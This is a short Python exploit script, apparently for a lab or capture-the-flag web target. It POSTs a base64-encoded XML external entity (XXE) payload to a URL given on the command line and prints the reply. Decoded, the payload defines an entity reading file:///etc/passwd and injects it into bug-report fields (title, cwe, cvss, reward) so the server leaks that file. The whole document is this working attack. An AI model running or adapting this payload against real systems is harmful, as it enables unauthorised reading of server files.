#!/usr/bin/python3


import requests
import sys
import base64
from urllib.parse import quote


def implementXXE(url: str):
    data = '''PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4NCjwhRE9DVFlQRSBmb28gWw0KICA8IUVMRU1FTlQgZm9vIEFOWSA%2bDQogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0%2bDQogICAgICAgICAgICAgICAgPGJ1Z3JlcG9ydD4NCiAgICAgICAgICAgICAgICA8dGl0bGU%2bJnh4ZTs8L3RpdGxlPg0KICAgICAgICAgICAgICAgIDxjd2U%2bJnh4ZTs8L2N3ZT4NCiAgICAgICAgICAgICAgICA8Y3Zzcz4meHhlOzwvY3Zzcz4NCiAgICAgICAgICAgICAgICA8cmV3YXJkPiZ4eGU7PC9yZXdhcmQ%2bDQogICAgICAgICAgICAgICAgPC9idWdyZXBvcnQ%2b'''
    #data = quote(data)
    
    sess = requests.Session()
    ress = sess.post(url=url, data=data)
    print(ress.text)


def main():
    try:
        main_url = sys.argv[1]
        implementXXE(main_url)

    except Exception as e:
        print(str(e))
        exit(1)


if __name__ == "__main__":
    main()
